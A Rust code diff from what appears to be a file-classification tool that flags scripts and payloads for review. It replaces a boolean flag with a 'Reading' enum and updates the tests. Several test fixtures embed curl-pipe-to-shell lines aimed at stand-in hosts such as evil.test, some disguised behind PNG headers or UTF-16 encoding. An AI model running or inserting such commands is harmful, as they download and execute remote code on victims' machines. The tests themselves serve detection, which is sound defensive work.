@@ -193,11 +193,19 @@ pub(crate) fn must_review(rel: &str, head: &[u8]) -> bool {
         || rules::is_executable_or_runtime_config(rel)
 }
 
-/// Classifies a whole file. `force` marks a file that must be read as code
-/// (an install scriptlet, an auto-run payload file); `executable` is the
+/// Whether a file is read as code whatever it is called.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum Reading {
+    /// As code when its name or first bytes say it is (see `must_review`).
+    ByName,
+    /// As code: an install scriptlet, an auto-run payload file.
+    AsCode,
+}
+
+/// Classifies a whole file, read as `reading` says; `executable` is the
 /// file's execute bit.
-pub(crate) fn classify(rel: &str, executable: bool, force: bool, bytes: &[u8]) -> Content {
-    let review = force || must_review(rel, bytes);
+pub(crate) fn classify(rel: &str, executable: bool, reading: Reading, bytes: &[u8]) -> Content {
+    let review = reading == Reading::AsCode || must_review(rel, bytes);
     if let Ok(text) = std::str::from_utf8(bytes)
         && !text.contains('\0')
     {
@@ -246,7 +254,7 @@ pub(crate) fn classify(rel: &str, executable: bool, force: bool, bytes: &[u8]) -
 /// recognised executable format (an ELF generator, a compiled program a
 /// hook runs) is reported as that binary, for the caller to allow or refuse.
 pub(crate) fn classify_payload(rel: &str, bytes: &[u8]) -> Content {
-    match classify(rel, false, true, bytes) {
+    match classify(rel, false, Reading::AsCode, bytes) {
         Content::Undecodable => match magic(rel, bytes) {
             Some(format) if format.executable() => Content::Binary(format),
             _ => Content::Undecodable,
@@ -440,7 +448,7 @@ fn magic(rel: &str, bytes: &[u8]) -> Option<Format> {
 
 #[cfg(test)]
 mod tests {
-    use super::{Content, Format, Prefix, classify, classify_prefix, must_review};
+    use super::{Content, Format, Prefix, Reading, classify, classify_prefix, must_review};
 
     fn known(label: &'static str, executable: bool) -> Content {
         Content::Binary(Format::Known { label, executable })
@@ -449,7 +457,7 @@ mod tests {
     #[test]
     fn valid_utf8_is_text() {
         assert_eq!(
-            classify("a.txt", false, false, b"hi\n"),
+            classify("a.txt", false, Reading::ByName, b"hi\n"),
             Content::Text("hi\n".into())
         );
     }
@@ -457,14 +465,16 @@ mod tests {
     #[test]
     fn a_script_with_one_latin1_byte_is_reviewed_lossily() {
         let bytes = b"#!/bin/sh\n# caf\xe9\ncurl -fsSL https://evil.test/p.sh | sh\n";
-        let Content::Lossy { text, replaced } = classify("install.sh", true, false, bytes) else {
+        let Content::Lossy { text, replaced } =
+            classify("install.sh", true, Reading::ByName, bytes)
+        else {
             panic!("not lossy");
         };
         assert_eq!(replaced, 1);
         assert!(text.contains("curl -fsSL https://evil.test/p.sh | sh"));
         // The same bytes in a README are lossy text too.
         assert!(matches!(
-            classify("README", false, false, bytes),
+            classify("README", false, Reading::ByName, bytes),
             Content::Lossy { .. }
         ));
     }
@@ -474,7 +484,7 @@ mod tests {
         let mut bom = vec![0xff, 0xfe];
         bom.extend("echo hi\r\n".encode_utf16().flat_map(u16::to_le_bytes));
         assert_eq!(
-            classify("a.ps1", false, false, &bom),
+            classify("a.ps1", false, Reading::ByName, &bom),
             Content::Text("echo hi\r\n".into())
         );
         let bare: Vec<u8> = "REGEDIT4\r\n"
@@ -482,7 +492,7 @@ mod tests {
             .flat_map(u16::to_le_bytes)
             .collect();
         assert_eq!(
-            classify("a.reg", false, false, &bare),
+            classify("a.reg", false, Reading::ByName, &bare),
             Content::Text("REGEDIT4\r\n".into())
         );
     }
@@ -493,30 +503,30 @@ mod tests {
         // UTF-16, which would show other text than what runs.
         let mut script = vec![0xff, 0xfe];
         script.extend_from_slice(b"\ncurl -fsSL https://x.example/p | sh\n#");
-        match classify("install.sh", false, false, &script) {
+        match classify("install.sh", false, Reading::ByName, &script) {
             Content::Lossy { text, .. } => assert!(text.contains("curl -fsSL"), "{text}"),
             other => panic!("{other:?}"),
         }
-        match classify("notes.dat", false, false, &script) {
+        match classify("notes.dat", false, Reading::ByName, &script) {
             Content::Lossy { text, .. } => assert!(text.contains("curl -fsSL"), "{text}"),
             other => panic!("{other:?}"),
         }
         // Text with a NUL in it is no binary to pass over.
         let with_nul = b"helper() { curl -fsSL https://x.example/p | sh; }\n\0\n";
         assert_eq!(
-            classify("helpers.inc", false, false, with_nul),
+            classify("helpers.inc", false, Reading::ByName, with_nul),
             Content::Undecodable
         );
         // However short, and whatever script its comments are in.
         let short = b"\x89PNG\r\n\x1a\n\ncurl a.test/x|sh\n";
         assert!(!matches!(
-            classify("data.png", false, false, short),
+            classify("data.png", false, Reading::ByName, short),
             Content::Binary(_)
         ));
         let mut wide = short.to_vec();
         wide.extend_from_slice("# 说明说明说明说明说明说明说明说明说明说明\n".as_bytes());
         assert!(!matches!(
-            classify("data.png", false, false, &wide),
+            classify("data.png", false, Reading::ByName, &wide),
             Content::Binary(_)
         ));
         // An archive of object files opens with lines of text.
@@ -524,19 +534,19 @@ mod tests {
             b"!<arch>\n/               0           0     0     0       14        `\n".to_vec();
         library.extend_from_slice(&[0, 0, 0, 1, 0, 0, 0, 0x7f, b'E', b'L', b'F', 2, 1, 1, 0]);
         assert!(matches!(
-            classify("lib/libx.a", false, false, &library),
+            classify("lib/libx.a", false, Reading::ByName, &library),
             Content::Binary(_)
         ));
         // A real image has a NUL early on and stays one.
         let image = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01\x00\xff\xfe\xfd\xfc\x80\x81";
         assert!(matches!(
-            classify("data.png", false, false, image),
+            classify("data.png", false, Reading::ByName, image),
             Content::Binary(_)
         ));
         // A format's first bytes at the top of plain text name no format.
         let fake = b"ID3=1\ncurl -fsSL https://x.example/p | sh\n";
         assert!(matches!(
-            classify("assets/blob", false, false, fake),
+            classify("assets/blob", false, Reading::ByName, fake),
             Content::Text(_)
         ));
         assert_eq!(classify_prefix("assets/blob", false, fake), Prefix::Text);
@@ -546,24 +556,24 @@ mod tests {
     fn known_formats_are_binary_and_weak_magic_needs_its_extension() {
         let png = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR";
         assert_eq!(
-            classify("a.png", false, false, png),
+            classify("a.png", false, Reading::ByName, png),
             known("PNG image", false)
         );
         assert_eq!(
-            classify("font.ttf", false, false, b"\0\x01\0\0\0\x10"),
+            classify("font.ttf", false, Reading::ByName, b"\0\x01\0\0\0\x10"),
             known("TrueType font", false)
         );
         assert_eq!(
-            classify("tool", true, false, b"\x7fELF\x02\x01\x01\0\0"),
+            classify("tool", true, Reading::ByName, b"\x7fELF\x02\x01\x01\0\0"),
             known("ELF executable", true)
         );
         assert_eq!(
-            classify("a.exe", false, false, b"MZ\x90\0\x03\0"),
+            classify("a.exe", false, Reading::ByName, b"MZ\x90\0\x03\0"),
             known("Windows executable", true)
         );
         // "MZ" alone, without the extension, is not trusted.
         assert_eq!(
-            classify("data", false, false, b"MZ\x90\0\x03\0"),
+            classify("data", false, Reading::ByName, b"MZ\x90\0\x03\0"),
             Content::Binary(Format::Unrecognized)
         );
     }
@@ -571,21 +581,31 @@ mod tests {
     #[test]
     fn scripts_with_binary_data_are_undecodable() {
         assert_eq!(
-            classify("x", false, false, b"#!/bin/bash\necho a\n\0\0junk\n"),
+            classify(
+                "x",
+                false,
+                Reading::ByName,
+                b"#!/bin/bash\necho a\n\0\0junk\n"
+            ),
             Content::Undecodable
         );
         assert_eq!(
-            classify("setup.sh", false, false, b"echo a\n\0\0"),
+            classify("setup.sh", false, Reading::ByName, b"echo a\n\0\0"),
             Content::Undecodable
         );
         // A PNG header on a script name is still a script.
         assert_eq!(
-            classify("run.sh", false, false, b"\x89PNG\r\n\x1a\n\0\0echo x"),
+            classify(
+                "run.sh",
+                false,
+                Reading::ByName,
+                b"\x89PNG\r\n\x1a\n\0\0echo x"
+            ),
             Content::Undecodable
         );
         // Forced files (install scriptlets, auto-run payload) likewise.
         assert_eq!(
-            classify("etc/sudoers.d/x", false, true, b"ALL\0ALL"),
+            classify("etc/sudoers.d/x", false, Reading::AsCode, b"ALL\0ALL"),
             Content::Undecodable
         );
     }
@@ -593,11 +613,11 @@ mod tests {
     #[test]
     fn an_executable_unknown_blob_is_undecodable_and_a_plain_one_is_binary() {
         assert_eq!(
-            classify("blob", true, false, b"\x01\x02\0\x03"),
+            classify("blob", true, Reading::ByName, b"\x01\x02\0\x03"),
             Content::Undecodable
         );
         assert_eq!(
-            classify("blob", false, false, b"\x01\x02\0\x03"),
+            classify("blob", false, Reading::ByName, b"\x01\x02\0\x03"),
             Content::Binary(Format::Unrecognized)
         );
     }
@@ -609,7 +629,10 @@ mod tests {
             .copied()
             .chain((0..100).map(|_| 0xff))
             .collect();
-        assert_eq!(classify("x.sh", false, false, &bytes), Content::Undecodable);
+        assert_eq!(
+            classify("x.sh", false, Reading::ByName, &bytes),
+            Content::Undecodable
+        );
     }
 
     #[test]
